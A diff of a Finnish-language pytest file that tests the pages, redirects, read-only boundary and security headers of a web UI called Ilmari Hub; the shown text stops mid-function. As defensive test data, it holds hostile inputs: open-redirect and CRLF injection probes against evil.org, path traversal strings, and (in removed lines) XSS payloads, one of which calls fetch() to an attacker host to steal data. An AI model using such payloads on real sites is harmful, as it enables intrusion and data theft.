@@ -1,13 +1,14 @@
-"""Black-box HTTP checks with manually authored publications and hostile inputs.
+"""Hubin HTTP-raja ja sivut kehitys- ja esimerkkitilassa (Hub juureksi 18.11.2026).
 
-TestClient's absent client address represents the Unix socket boundary. Ordinary
-TCP clients must fail even when they supply convincing identity headers.
+TestClientin puuttuva asiakasosoite edustaa Unix-soketin rajaa. Tavallisen TCP-asiakkaan pitää epäonnistua, vaikka se
+antaisi uskottavat identiteettiotsakkeet. Sivurakenne (neljä valikkolinkkiä, vanhojen osoitteiden ohjaukset, poistetut
+osat) on kirjoitettu tähän käsin speksin mukaan.
 """
 
 from __future__ import annotations
 
-from datetime import UTC, date, datetime, timedelta
 import json
+import re
 from pathlib import Path
 from urllib.parse import parse_qs, urlsplit
 
@@ -15,43 +16,20 @@ from bs4 import BeautifulSoup
 from fastapi.testclient import TestClient
 import pytest
 
-from ilmari_ui.app import Settings, create_app, format_time, series_chart
-from ilmari_ui.runs import FILE_LIMITS
+from ilmari_ui.app import PACKAGE_DIR, Settings, create_app, format_time, koneen_ika, lyhyt_aika
+from ilmari_ui.config import parse_config
 
-RUN_ID = "20261013-001914-yo-independent"
-SKINS = ("arctic-command", "slate-electric", "nordic-paper", "aurora-lab")
-PAGES = (
-    "/hub",
-    "/hub/keskustelu",
-    "/hub/ilmari",
-    "/hub/ajot",
-    "/hub/hyvaksynnat",
-    "/hub/sovellukset",
-    "/hub/ideat",
-    "/hub/jarjestelma",
-    "/hub/asetukset",
-)
-APP_PAGES = tuple(f"/hub/sovellukset/{app}" for app in ("ravintopolku", "unicafe", "ideat", "jarvis", "hahmo"))
-
-
-def test_series_at_start_of_calendar_does_not_break_home_chart():
-    chart = series_chart({"kind": "time_series", "data": {
-        "period_start": "0001-01-01", "period_end": "0001-01-02",
-        "points": [{"date": "0001-01-01", "value": 8}, {"date": "0001-01-02", "value": None}],
-    }}, 90)
-    assert chart["total"] == 2
-    assert chart["coverage"] == 1
-    assert chart["points"][1]["missing"] is True
-
-
-def test_published_negative_series_is_visible_instead_of_assuming_zero():
-    chart = series_chart({"kind": "time_series", "data": {
-        "period_start": "2026-10-12", "period_end": "2026-10-13",
-        "points": [{"date": "2026-10-12", "value": -10}, {"date": "2026-10-13", "value": -5}],
-    }})
-    assert chart["coverage"] == 2
-    assert all(35 <= point["y"] <= 170 for point in chart["points"])
-    assert chart["points"][0]["value"] == -10
+# (osoite, otsikko, aktiivinen valikkolinkki)
+SIVUT = (("/hub", "Nyt", "Nyt"), ("/hub/keskustelu", "Keskustelu", "Keskustelu"), ("/hub/kehita", "Työt", "Työt"),
+         ("/hub/asetukset", "Asetukset", "Asetukset"), ("/hub/dokumentit", "Dokumentit", "Asetukset"))
+VALIKKO = [("Nyt", "/hub"), ("Keskustelu", "/hub/keskustelu"), ("Työt", "/hub/kehita"), ("Asetukset", "/hub/asetukset")]
+# (kohde, ankkuri): kysely säilyy ja ankkuri tulee sen perään (vanha gateway palaa /hub/mallit-osoitteeseen)
+VANHAT = {"/hub/ilmari": "/hub", "/hub/mallit": ("/hub/asetukset", "#aivot"), "/hub/jarjestelma": ("/hub/asetukset", "#kone"),
+          "/hub/saannot": "/hub/dokumentit", "/hub/ajot": "/hub", "/hub/ajot/20261013-001914-yo-demo": "/hub",
+          "/hub/hyvaksynnat": "/hub", "/hub/sovellukset": "/hub", "/hub/sovellukset/ravintopolku": "/hub",
+          "/hub/ideat": "/hub"}
+KIELLETYT_SANAT = ("gateway", "julkaisu", "julkais", "dsh", "adr", "kontti", "politiikka", "main")
+FONTIT = ("IBMPlexMono-Regular.woff2", "IBMPlexMono-Italic.woff2", "IBMPlexMono-Medium.woff2", "IBMPlexMono-SemiBold.woff2")
 
 
 def local_client(settings: Settings | None = None) -> TestClient:
@@ -68,159 +46,186 @@ def demo_client():
         yield client
 
 
-@pytest.fixture
-def publication(tmp_path: Path) -> Path:
-    root = tmp_path / "published-runs"
-    run = root / RUN_ID
-    run.mkdir(parents=True)
-    # Test keys deliberately do not invent an upstream MUODOT.md schema.
-    (run / "meta.json").write_text(json.dumps({"test_note": "manually authored", "test_count": 2}), encoding="utf-8")
-    (run / "raportti.md").write_text("# Riippumaton testiraportti\nJulkaistu havainto.\n", encoding="utf-8")
-    (run / "ehdotukset.jsonl").write_text('{"test_note":"Rajattu ehdotus"}\n', encoding="utf-8")
-    (run / "sol-tulos.json").write_text('{"test_result":"Tulosteksti"}', encoding="utf-8")
-    (run / "luonnos.patch").write_text("--- a/example\n+++ b/example\n-old\n+new\n", encoding="utf-8")
-    return root
+# --- Sivut ja rakenne --------------------------------------------------------------------------------------------
+
+@pytest.mark.parametrize("polku,otsikko,aktiivinen", SIVUT)
+def test_jokainen_sivu_toimii_kehitys_ja_esimerkkitilassa(demo_client, polku, otsikko, aktiivinen):
+    for kysely in ("", "?demo=1"):
+        r = demo_client.get(polku + kysely)
+        dom = soup(r)
+        assert r.status_code == 200 and dom.html["lang"] == "fi" and dom.find("main", id="main") is not None
+        assert dom.title.get_text() == f"{otsikko} · Ilmari"
+        assert dom.find("meta", attrs={"name": "color-scheme"})["content"] == "light"
+        assert dom.find("meta", attrs={"name": "theme-color"})["content"] == "#f1ead9"
+        assert [l["href"] for l in dom.find_all("link", rel="stylesheet")] == ["/hub/static/app.css"]
+        assert len(dom.find_all("h1")) == 1
+        merkinta = dom.select("main > .wrap > p.note")
+        assert bool(merkinta and "Esimerkkitila" in merkinta[0].get_text()) is bool(kysely)
+        alapalkki = " ".join(dom.find("footer", class_="foot").get_text(" ").split())
+        assert re.fullmatch(r"Ilmari Hub · (kehitysympäristö|esimerkkitila) Haettu klo \d\d\.\d\d", alapalkki)
 
 
-def metric_payload() -> dict:
-    now = datetime.now(UTC).replace(microsecond=0)
-    return {
-        "schema_version": "ilmari.card.v1", "app_id": "unicafe", "card_id": "test-card",
-        "kind": "metric", "title": "Riippumaton julkaisukortti", "data_class": "public",
-        "published_at": (now - timedelta(minutes=1)).isoformat(),
-        "observed_until": (now - timedelta(minutes=2)).isoformat(),
-        "fresh_until": (now + timedelta(days=1)).isoformat(),
-        "source": {"name": "Käsin kirjoitettu testilähde", "url": None},
-        "units": "kpl", "data": {"value": 17, "note": "Vain julkaistu yhteenveto"},
-    }
+@pytest.mark.parametrize("polku,otsikko,aktiivinen", SIVUT)
+def test_valikossa_on_tasan_nelja_linkkia(demo_client, polku, otsikko, aktiivinen):
+    for kysely, perassa in (("", ""), ("?demo=1", "?demo=1")):
+        dom = soup(demo_client.get(polku + kysely))
+        linkit = dom.select("header.top nav.nav a")
+        assert [(a.get_text(), a["href"]) for a in linkit] == [(n, h + perassa) for n, h in VALIKKO]
+        assert [a.get_text() for a in linkit if a.get("aria-current") == "page"] == [aktiivinen]
+        brand = dom.select_one("header.top a.brand")
+        assert brand.get_text() == "ILMARI" and brand["href"] == "/hub" + perassa
+        assert len(dom.find_all("nav")) == 1   # ei sivupalkkia, alapalkkia eikä hampurilaisvalikkoa
 
 
-def publish_card(root: Path, payload: dict) -> Path:
-    folder = root / payload["app_id"]
-    folder.mkdir(parents=True, exist_ok=True)
-    filename = folder / f"{payload['card_id']}.json"
-    filename.write_text(json.dumps(payload), encoding="utf-8")
-    return filename
+def test_esimerkkitila_kulkee_sisaisissa_linkeissa(demo_client):
+    for polku, _, _ in SIVUT:
+        for a in soup(demo_client.get(polku + "?demo=1")).select("a[href^='/hub']"):
+            assert parse_qs(urlsplit(a["href"]).query).get("demo") == ["1"], (polku, a["href"])
 
 
-@pytest.mark.parametrize("field", ["runs_dir", "cards_dir"])
-@pytest.mark.parametrize("root", [Path("relative-publication"), Path("/"), Path("/tmp/../publication")])
-def test_publication_configuration_requires_a_specific_absolute_root(field, root):
-    with pytest.raises(ValueError, match="absoluuttinen"):
-        Settings(**{field: root})
+@pytest.mark.parametrize("vanha,uusi", VANHAT.items())
+def test_vanhat_osoitteet_ohjataan_kysely_mukana(demo_client, vanha, uusi):
+    uusi, ankkuri = uusi if isinstance(uusi, tuple) else (uusi, "")
+    r = demo_client.get(vanha, follow_redirects=False)
+    assert r.status_code == 307 and r.headers["location"] == uusi + ankkuri and "set-cookie" not in r.headers
+    r = demo_client.get(vanha + "?demo=1&toihin=rajatesti", follow_redirects=False)
+    assert r.status_code == 307 and r.headers["location"] == uusi + "?demo=1&toihin=rajatesti" + ankkuri
+    assert demo_client.get(vanha + "?demo=1").status_code == 200   # seurattuna sivu toimii
 
 
-@pytest.mark.parametrize("page", PAGES + APP_PAGES)
-def test_every_documented_page_renders_in_live_and_demo_modes(demo_client, page):
-    for query in ("", "?demo=1"):
-        response = demo_client.get(page + query)
-        assert response.status_code == 200
-        dom = soup(response)
-        assert dom.html["lang"] == "fi"
-        assert dom.find("main", id="main") is not None
-        assert dom.title.get_text().endswith("· Ilmari Hub")
-        assert bool(dom.select(".demo-banner")) == bool(query)
+def test_ohjaus_ei_ole_avoin_uudelleenohjaus(demo_client):
+    for kysely in ("next=//evil.org", "x=%0d%0aLocation:%20https://evil.org", "@evil.org"):
+        r = demo_client.get("/hub/ilmari?" + kysely, follow_redirects=False)
+        assert r.status_code == 307 and r.headers["location"].startswith("/hub?")
+        assert "\r" not in r.headers["location"] and "\n" not in r.headers["location"]
 
 
-@pytest.mark.parametrize("skin", SKINS)
-def test_skin_demo_and_card_selection_survive_navigation(demo_client, skin):
-    response = demo_client.get(f"/hub?skin={skin}&demo=1&home_cards=unicafe,ravintopolku")
-    dom = soup(response)
-    assert dom.html["data-skin"] == skin
-    links = dom.select("nav a[href]")
-    assert links
-    for link in links:
-        url = urlsplit(link["href"])
-        if not url.path.startswith("/hub"):
-            continue
-        query = parse_qs(url.query)
-        assert query["skin"] == [skin]
-        assert query["demo"] == ["1"]
-        assert query["home_cards"] == ["unicafe,ravintopolku"]
-        destination = demo_client.get(link["href"])
-        assert destination.status_code == 200
-        assert soup(destination).html["data-skin"] == skin
+@pytest.mark.parametrize("metodi", ["POST", "PUT", "DELETE"])
+def test_vanhat_osoitteet_eivat_ota_vastaan_muuta_kuin_lukua(demo_client, metodi):
+    assert demo_client.request(metodi, "/hub/ilmari").status_code == 403   # vartija ennen reititystä
 
 
-@pytest.mark.parametrize("skin", ["not-a-theme", '<script>alert("skin")</script>', "", "ARCTIC-COMMAND"])
-def test_unrecognized_skin_is_not_reflected_as_markup(demo_client, skin):
-    response = demo_client.get("/hub", params={"skin": skin})
-    assert response.status_code == 200
-    assert soup(response).html["data-skin"] == "arctic-command"
-    assert not soup(response).find("script")
+def test_poistetut_osat_eivat_nay(demo_client):
+    for polku, _, _ in SIVUT:
+        for kysely in ("", "?demo=1"):
+            r = demo_client.get(polku + kysely)
+            dom = soup(r)
+            assert not dom.find("svg") and not dom.select(".sidebar, .bottom-nav, .mobile-menu, .demo-banner, .panel")
+            assert "skin" not in r.text and "data-skin" not in r.text and "themes.css" not in r.text
+            valikko = dom.select_one("nav.nav").get_text()
+            for nimi in ("Koti", "Ilmari nyt", "Kehitä", "Ajot", "Sovellukset", "Hyväksynnät", "Ideat", "Järjestelmä",
+                         "Säännöt", "Mallit"):
+                assert nimi not in valikko
+    for staattinen in ("themes.css", "icon.svg"):
+        assert demo_client.get(f"/hub/static/{staattinen}").status_code == 404
 
 
-def test_settings_offer_four_selectable_skins(demo_client):
-    response = demo_client.get("/hub/asetukset?demo=1")
-    dom = soup(response)
-    selectable = set()
-    for link in dom.select("main a[href]"):
-        query = parse_qs(urlsplit(link["href"]).query)
-        if "skin" in query:
-            selectable.add(query["skin"][0])
-    for select in dom.select("main select[name=skin]"):
-        selectable.update(option["value"] for option in select.find_all("option"))
-    assert set(SKINS) <= selectable
+def tuotanto_asiakas(tmp_path) -> TestClient:
+    config = parse_config({"hub": {"rp_id": "tyoasema.test", "julkaisut": str(tmp_path / "ajot"),
+                                   "kayttajat": {"elias@github": "elias"}}})
+    return TestClient(create_app(Settings(identity=config)), base_url="http://localhost", client=None)
 
 
-def test_assets_are_local_and_actually_load(demo_client):
-    response = demo_client.get("/hub")
-    dom = soup(response)
-    assert not dom.find("script")
-    assets = [link["href"] for link in dom.find_all("link", href=True) if link.get("rel") in (["stylesheet"], ["icon"])]
-    assert assets
-    for asset in assets:
-        assert asset.startswith("/hub/static/")
-        asset_response = demo_client.get(asset)
-        assert asset_response.status_code == 200
-        assert asset_response.content
+def test_kayttoliittyman_teksteissa_ei_jargonia(demo_client, tmp_path):
+    """Kehitystilan ja tyhjän tuotannon sivuilla näkyy vain käyttöliittymän oma teksti (ei dataa): ei sanoja gateway,
+    julkaisu, dsh, ADR, kontti tai politiikka. (Esimerkkiaineisto on dataa, ei käyttöliittymän tekstiä.)"""
+    serve = {"x-forwarded-host": "tyoasema.test", "tailscale-user-login": "elias@github"}
+    with tuotanto_asiakas(tmp_path) as tuotanto:
+        vastaukset = [demo_client.get(p) for p, _, _ in SIVUT] + [demo_client.get("/hub/ei-ole")]
+        vastaukset += [tuotanto.get(p.removeprefix("/hub") or "/", headers=serve) for p, _, _ in SIVUT]
+        # esimerkkitilan sivut (myös työt, dokumentti ja haku): data (tulosteet, dokumentit, koodi) ei ole
+        # käyttöliittymän tekstiä, joten se jätetään pois
+        for p in [p for p, _, _ in SIVUT] + ["/hub/kehita/98", "/hub/kehita/41", "/hub/kehita/42", "/hub/kehita/43",
+                                             "/hub/kehita/40", "/hub/dokumentit/arkkitehtuuri", "/hub/dokumentit?q=ilmari"]:
+            vastaukset.append(demo_client.get(p + ("&" if "?" in p else "?") + "demo=1"))
+    for r in vastaukset:
+        dom = soup(r)
+        for data in dom.select(".pre, .sheet, .prose, pre, code, a[href*='/hub/dokumentit/']"):
+            data.decompose()
+        teksti = dom.get_text(" ").lower()
+        teksti = teksti.replace("adresseja", "")
+        for sana in KIELLETYT_SANAT:
+            assert not re.search(rf"\b{sana}", teksti), (r.url, sana)
 
 
-def test_repository_root_redirects_to_the_hub_without_a_session_cookie(demo_client):
+def test_ei_skripteja_tyyleja_eika_tapahtumakasittelijoita(demo_client):
+    for polku, _, _ in SIVUT:
+        for kysely in ("", "?demo=1"):
+            dom = soup(demo_client.get(polku + kysely))
+            assert not dom.find_all(["script", "style", "iframe", "object", "embed"])
+            assert not [a for t in dom.find_all(True) for a in t.attrs if a.lower().startswith("on") or a == "style"]
+
+
+def test_paikalliset_tiedostot_latautuvat_turvaotsakkein(demo_client):
+    dom = soup(demo_client.get("/hub"))
+    resurssit = [l["href"] for l in dom.find_all("link", href=True)]
+    assert set(resurssit) == {"/hub/static/favicon.svg", "/hub/static/manifest.webmanifest",
+                              "/hub/static/icon-192.png", "/hub/static/app.css"}
+    for polku in resurssit + [f"/hub/static/fonts/{f}" for f in FONTIT] + ["/hub/static/fonts/IBM-Plex-LICENSE.txt",
+                                                                         "/hub/static/icon-512.png",
+                                                                         "/hub/static/icon-maskable-512.png"]:
+        r = demo_client.get(polku)
+        assert r.status_code == 200 and r.content, polku
+        assert "script-src 'none'" in r.headers["content-security-policy"] and r.headers["x-content-type-options"] == "nosniff"
+    assert demo_client.get("/hub/static/fonts/IBMPlexMono-Regular.woff2").headers["content-type"] == "font/woff2"
+    assert "SIL Open Font License" in demo_client.get("/hub/static/fonts/IBM-Plex-LICENSE.txt").text
+
+
+def test_tyyli_viittaa_vain_paikallisiin_fontteihin():
+    css = (PACKAGE_DIR / "static" / "app.css").read_text(encoding="utf-8")
+    viittaukset = re.findall(r'url\("([^"]+)"\)', css)
+    assert sorted(viittaukset) == sorted(f"fonts/{f}" for f in FONTIT)
+    assert all((PACKAGE_DIR / "static" / v).is_file() for v in viittaukset)
+    assert "@import" not in css and "http" not in css
+    # yksi tyyli: ei tummaa tilaa, ei varjoja eikä pyöristyksiä
+    assert "prefers-color-scheme" not in css and "border-radius: 0" in css
+    assert {v.strip() for v in re.findall(r"box-shadow:\s*([^;}]+)", css)} <= {"inset 0 -2px 0 var(--ink)", "none"}
+    assert "text-shadow" not in css and "gradient" not in css
+    assert not re.search(r"border-radius:\s*[1-9]", css)
+
+
+def test_manifesti_ja_kuvakkeet():
+    m = json.loads((PACKAGE_DIR / "static" / "manifest.webmanifest").read_text(encoding="utf-8"))
+    assert (m["name"], m["start_url"], m["background_color"], m["theme_color"]) == ("Ilmari", "/hub", "#f1ead9", "#f1ead9")
+    for kuvake in m["icons"]:
+        tiedosto = PACKAGE_DIR / "static" / Path(kuvake["src"]).name
+        koko = int(kuvake["sizes"].split("x")[0])
+        data = tiedosto.read_bytes()
+        assert data[:8] == b"\x89PNG\r\n\x1a\n" and int.from_bytes(data[16:20], "big") == koko
+    svg = (PACKAGE_DIR / "static" / "favicon.svg").read_text(encoding="utf-8")
+    assert "#f1ead9" in svg and "#1f1b16" in svg and "#a8431a" in svg and "<script" not in svg
+
+
+def test_juuri_ohjaa_hubiin_ilman_evastetta(demo_client):
     response = demo_client.get("/", follow_redirects=False)
-    assert response.status_code == 307
-    assert response.headers["location"] == "/hub"
-    assert "set-cookie" not in response.headers
+    assert response.status_code == 307 and response.headers["location"] == "/hub" and "set-cookie" not in response.headers
 
 
-def test_home_card_selection_is_deduplicated_and_allowlisted(demo_client):
-    response = demo_client.get("/hub?demo=1&home_cards=unicafe,unicafe,unknown,../../secret")
-    assert response.status_code == 200
-    dom = soup(response)
-    home_cards = dom.select("main .app-card")
-    assert len(home_cards) == 1
-    assert "UniCafe" in home_cards[0].get_text()
-    assert "../../secret" not in response.text
-    for link in dom.select("nav a[href]"):
-        if urlsplit(link["href"]).path.startswith("/hub"):
-            assert parse_qs(urlsplit(link["href"]).query)["home_cards"] == ["unicafe"]
+def test_esimerkkitila_on_oletuksena_pois_eika_kehitystila_nayta_keksittya(tmp_path):
+    r = local_client(Settings()).get("/hub?demo=1")
+    assert r.status_code == 200 and "Esimerkkitila" not in r.text and "Aamuraportti" not in r.text
+    assert "Ilmarin tila ei ole saatavilla" in r.text
 
 
-def test_demo_is_disabled_by_default_and_live_has_no_fabricated_card_or_run(tmp_path):
-    client = local_client(Settings(runs_dir=tmp_path / "absent", demo_enabled=False))
-    response = client.get("/hub?demo=1")
-    dom = soup(response)
-    assert response.status_code == 200
-    assert not dom.select(".demo-banner")
-    assert "Synteettinen kehitysjulkaisu" not in response.text
-    assert "Esimerkki: paahdettu kasviskulho" not in response.text
-    assert "20261013-001914-yo-demo" not in response.text
-    assert "ei yhdistetty" in response.text.lower()
-    assert "Ei yhteyttä isäntäkoneen tilaan" in response.text
+def test_esimerkkitila_vaatii_kyselyn(demo_client):
+    live, demo = demo_client.get("/hub"), demo_client.get("/hub?demo=1")
+    assert "Esimerkkitila" not in live.text and "Aamuraportti" not in live.text
+    assert "Esimerkkitila: keksitty aineisto" in demo.text and "Aamuraportti 19.11." in demo.text
 
 
-def test_demo_requires_explicit_query_opt_in(demo_client):
-    live = demo_client.get("/hub")
-    demo = demo_client.get("/hub?demo=1")
-    assert not soup(live).select(".demo-banner")
-    assert soup(demo).select(".demo-banner")
-    assert "DEMO – ESIMERKKIDATA" in demo.text
-    assert "Ei oikeita ajoja" in demo.text
-    assert "Esimerkki: paahdettu kasviskulho" in demo.text
+@pytest.mark.parametrize("polku,paivitys", [("/hub?demo=1", "30"), ("/hub", None), ("/hub/kehita?demo=1", "15"),
+                                            ("/hub/kehita", None), ("/hub/asetukset?demo=1", None),
+                                            ("/hub/keskustelu?demo=1", None), ("/hub/dokumentit?demo=1", None)])
+def test_automaattinen_paivitys_vain_kun_jotain_on_kaynnissa(demo_client, polku, paivitys):
+    """Esimerkissä työvuoro ja työ 42 ovat käynnissä. Asetukset ei päivity koskaan (tyhjentäisi lomakkeet); keskustelu
+    päivittyy vain tuotannossa (test_keskustelu)."""
+    assert demo_client.get(polku).headers.get("refresh") == paivitys
 
+
+# --- Raja (kehitystila): vain luku, oma alkuperä, Unix-soketti ----------------------------------------------------
 
 @pytest.mark.parametrize("method", ["POST", "PUT", "PATCH", "DELETE", "OPTIONS", "TRACE"])
-@pytest.mark.parametrize("path", ["/hub", "/hub/hyvaksynnat", "/hub/keskustelu", "/hub/static/themes.css"])
+@pytest.mark.parametrize("path", ["/hub", "/hub/keskustelu", "/hub/asetukset", "/hub/static/app.css"])
 def test_all_mutating_or_unneeded_methods_fail_closed(demo_client, method, path):
     response = demo_client.request(method, path, content='{"approve":true}')
     assert response.status_code == 403
@@ -247,7 +252,7 @@ def test_untrusted_host_origin_fetch_metadata_or_funnel_is_rejected(demo_client,
     response = demo_client.get("/hub?demo=1", headers=headers)
     assert response.status_code == 403
     assert "Pääsy estetty" in response.text
-    assert "Esimerkki: paahdettu kasviskulho" not in response.text
+    assert "Aamuraportti" not in response.text
 
 
 @pytest.mark.parametrize("headers", [
@@ -270,15 +275,17 @@ def test_tcp_cannot_spoof_a_trusted_tailscale_identity(identity):
     assert client.get("/hub?demo=1", headers=identity).status_code == 403
 
 
-def test_security_headers_cover_success_denial_missing_pages_and_assets(demo_client):
+def test_security_headers_cover_success_denial_redirects_missing_pages_and_assets(demo_client):
     responses = (
         demo_client.get("/hub"), demo_client.get("/does-not-exist"),
         demo_client.get("/hub", headers={"host": "evil.org"}),
-        demo_client.get("/hub/static/themes.css"),
+        demo_client.get("/hub/static/app.css"), demo_client.get("/hub/static/fonts/IBMPlexMono-Regular.woff2"),
+        demo_client.get("/hub/ilmari", follow_redirects=False),
     )
     for response in responses:
         policy = response.headers["content-security-policy"]
-        for directive in ("default-src 'none'", "script-src 'none'", "connect-src 'none'", "frame-ancestors 'none'", "object-src 'none'", "base-uri 'none'"):
+        for directive in ("default-src 'none'", "script-src 'none'", "connect-src 'none'", "frame-ancestors 'none'",
+                          "object-src 'none'", "base-uri 'none'", "font-src 'self'", "style-src 'self'"):
             assert directive in policy
         assert "unsafe-inline" not in policy and "https:" not in policy
         assert response.headers["cache-control"] == "no-store"
@@ -288,158 +295,19 @@ def test_security_headers_cover_success_denial_missing_pages_and_assets(demo_cli
         assert "set-cookie" not in response.headers
 
 
-def test_get_requests_never_modify_publications_or_claim_approval_authority(publication):
-    before = {path.relative_to(publication): path.read_bytes() for path in publication.rglob("*") if path.is_file()}
-    client = local_client(Settings(runs_dir=publication))
-    for page in PAGES + APP_PAGES + (f"/hub/ajot/{RUN_ID}",):
-        response = client.get(page)
-        assert response.status_code == 200
-        dom = soup(response)
-        assert not dom.find_all("form", method=lambda method: method and method.lower() != "get")
-        assert "set-cookie" not in response.headers
-    after = {path.relative_to(publication): path.read_bytes() for path in publication.rglob("*") if path.is_file()}
-    assert before == after
-    approvals = soup(client.get("/hub/hyvaksynnat"))
-    assert not approvals.select("button[type=submit]:not([disabled])")
-
-
-def test_report_json_and_patch_render_as_plain_text_not_active_html(publication):
-    marker = '<script>fetch("https://attacker.invalid/steal")</script>'
-    run = publication / RUN_ID
-    (run / "raportti.md").write_text(marker + '\n<img src=x onerror="alert(1)">', encoding="utf-8")
-    (run / "meta.json").write_text(json.dumps({"test_xss": marker}), encoding="utf-8")
-    (run / "ehdotukset.jsonl").write_text(json.dumps({"test_xss": marker}) + "\n", encoding="utf-8")
-    (run / "sol-tulos.json").write_text(json.dumps({"test_xss": marker}), encoding="utf-8")
-    (run / "luonnos.patch").write_text("+" + marker, encoding="utf-8")
-    response = local_client(Settings(runs_dir=publication)).get(f"/hub/ajot/{RUN_ID}")
-    assert response.status_code == 200
-    dom = soup(response)
-    assert not dom.find_all("script")
-    assert not dom.find_all("img", onerror=True)
-    assert marker in dom.get_text()
-    assert "&lt;script&gt;" in response.text
-    assert not dom.select("[onclick], [onerror], [onload]")
-
-
-def test_card_title_notes_units_and_source_are_escaped(tmp_path):
-    cards = tmp_path / "cards"
-    payload = metric_payload()
-    payload["title"] = '<img src=x onerror="alert(1)">'
-    payload["source"]["name"] = '<svg onload="alert(2)">'
-    payload["data"]["note"] = '<script>alert("note")</script>'
-    payload["units"] = '<b>test</b>'
-    publish_card(cards, payload)
-    client = local_client(Settings(cards_dir=cards, runs_dir=tmp_path / "missing"))
-    for page in ("/hub", "/hub/sovellukset/unicafe"):
-        response = client.get(page)
-        assert response.status_code == 200
-        dom = soup(response)
-        assert not dom.find_all("script")
-        assert not dom.select("[onerror], [onload]")
-        assert payload["source"]["name"] in dom.get_text()
-        assert payload["data"]["note"] in dom.get_text()
-        assert "&lt;svg" in response.text and "&lt;script" in response.text
-
-
-@pytest.mark.parametrize("url", ["javascript:alert(1)", "https://evil.invalid/source", "http://example.org/source"])
-def test_untrusted_source_url_does_not_become_a_link(tmp_path, url):
-    cards = tmp_path / "cards"
-    payload = metric_payload()
-    payload["source"]["url"] = url
-    publish_card(cards, payload)
-    response = local_client(Settings(cards_dir=cards, allowed_source_hosts=frozenset({"example.org"}))).get("/hub/sovellukset/unicafe")
-    assert response.status_code == 200
-    assert not soup(response).find("a", href=url)
-    assert payload["title"] not in response.text
-
-
-def test_one_invalid_app_is_isolated_and_valid_public_card_stays_available(tmp_path):
-    cards = tmp_path / "cards"
-    publish_card(cards, metric_payload())
-    bad = cards / "ravintopolku"
-    bad.mkdir()
-    (bad / "bad-card.json").write_text('{"secret":"must not leak" invalid', encoding="utf-8")
-    settings = Settings(cards_dir=cards, allowed_private_apps=frozenset({"ravintopolku"}), runs_dir=tmp_path / "missing")
-    response = local_client(settings).get("/hub")
-    assert response.status_code == 200
-    assert "Käsin kirjoitettu testilähde" in response.text
-    assert "must not leak" not in response.text
-    assert str(tmp_path) not in response.text
-
-
-@pytest.mark.parametrize("path", ["/hub/ajot/unknown", "/hub/ajot/%2E%2E%2Fsecret", "/hub/sovellukset/unknown", "/missing"])
+@pytest.mark.parametrize("path", ["/hub/kehita/unknown", "/hub/kehita/%2E%2E%2Fsecret", "/hub/dokumentit/x",
+                                  "/missing", "/hub/static/../app.py"])
 def test_missing_and_invalid_identifiers_have_safe_error_pages(demo_client, path):
-    response = demo_client.get(path)
+    response = demo_client.get(path + "?demo=1")
     assert response.status_code == 404
-    assert soup(response).find("main", id="main")
+    assert soup(response).find("main", id="main") or "Not Found" in response.text
     assert "Traceback" not in response.text and "/srv/aiops" not in response.text
 
 
-def test_missing_malformed_and_oversized_report_files_do_not_crash_detail(publication):
-    run = publication / RUN_ID
-    (run / "raportti.md").unlink()
-    (run / "meta.json").write_text("{not-json", encoding="utf-8")
-    (run / "luonnos.patch").write_bytes(b"+" * (FILE_LIMITS["luonnos.patch"] + 1))
-    response = local_client(Settings(runs_dir=publication)).get(f"/hub/ajot/{RUN_ID}")
-    assert response.status_code == 200
-    assert "+++" not in response.text
-    assert "{not-json" not in response.text
-    assert "Traceback" not in response.text and str(publication) not in response.text
-    assert "Tulosteksti" in response.text
-
-
-def test_default_read_model_does_not_infer_live_semantics_from_arbitrary_json(publication):
-    path = publication / RUN_ID / "meta.json"
-    path.write_text(json.dumps({"status": "APPROVED", "model": "SECRET-MODEL", "proposal_count": 424242, "demo_title": "FAKE-DEMO-TITLE", "demo_model": "FAKE-DEMO-MODEL"}), encoding="utf-8")
-    response = local_client(Settings(runs_dir=publication)).get("/hub/ajot")
-    assert response.status_code == 200
-    assert RUN_ID in response.text
-    assert all(marker not in response.text for marker in ("APPROVED", "SECRET-MODEL", "424242", "FAKE-DEMO-TITLE", "FAKE-DEMO-MODEL"))
-
-
-def independent_series() -> dict:
-    end = date(2026, 10, 13)
-    start = end - timedelta(days=89)
-    return {
-        "kind": "time_series",
-        "data": {
-            "period_start": start.isoformat(), "period_end": end.isoformat(),
-            "points": [
-                {"date": start.isoformat(), "value": 1700},
-                {"date": (end - timedelta(days=2)).isoformat(), "value": 2100},
-                {"date": (end - timedelta(days=1)).isoformat(), "value": None},
-                {"date": end.isoformat(), "value": 2200},
-            ],
-        },
-    }
-
-
-@pytest.mark.parametrize("days", [7, 30, 90])
-def test_chart_windows_are_exact_and_never_connect_across_missing_days(days):
-    chart = series_chart(independent_series(), days)
-    assert chart["total"] == days
-    assert len(chart["points"]) == days
-    assert chart["coverage"] == (3 if days == 90 else 2)
-    assert len(chart["segments"]) == (3 if days == 90 else 2)
-    assert all(" " not in segment for segment in chart["segments"])
-    assert chart["points"][-2]["missing"] is True
-    assert chart["points"][-2]["value"] is None
-    assert chart["points"][-2]["y"] is None
-    assert chart["points"][-1]["label"] == "13.10.2026"
-
-
-@pytest.mark.parametrize("days", ["7", "30", "90"])
-def test_chart_range_links_and_accessible_missing_data_are_present(demo_client, days):
-    response = demo_client.get(f"/hub/sovellukset/ravintopolku?demo=1&days={days}")
-    assert response.status_code == 200
-    dom = soup(response)
-    chart = dom.find("svg", role="img")
-    assert chart is not None
-    assert "Katkos" in chart.get("aria-label", "")
-    assert "Puuttuva tieto" in dom.get_text()
-    assert dom.find("table") is not None
-    query_days = {parse_qs(urlsplit(link["href"]).query).get("days", [None])[0] for link in dom.select("main a[href]")}
-    assert {"7", "30", "90"} <= query_days
+def test_virhesivu_on_samaa_tyylia(demo_client):
+    dom = soup(demo_client.get("/hub/ei-ole?demo=1"))
+    assert dom.title.get_text() == "Sivua ei löydy · Ilmari" and dom.select_one("a.back")["href"] == "/hub?demo=1"
+    assert not dom.select('nav a[aria-current="page"]')
 
 
 @pytest.mark.parametrize("value,expected", [
@@ -451,3 +319,31 @@ def test_chart_range_links_and_accessible_missing_data_are_present(demo_client, 
 ])
 def test_display_timestamps_use_helsinki_and_reject_ambiguous_times(value, expected):
     assert format_time(value) == expected
+
+
+def test_lyhyt_aika_ei_nayta_paivamaaralta():
+    """Tämän päivän aika on "klo 20.05" (ei luettavissa päiväksi 20.5.), muu "18.11. klo 21.14"; sitovat välilyönnit
+    pitävät ajan yhdellä rivillä."""
+    from datetime import datetime, timedelta
+    from ilmari_ui.app import HELSINKI
+    nyt = datetime.now(HELSINKI).replace(hour=20, minute=5, second=0, microsecond=0)
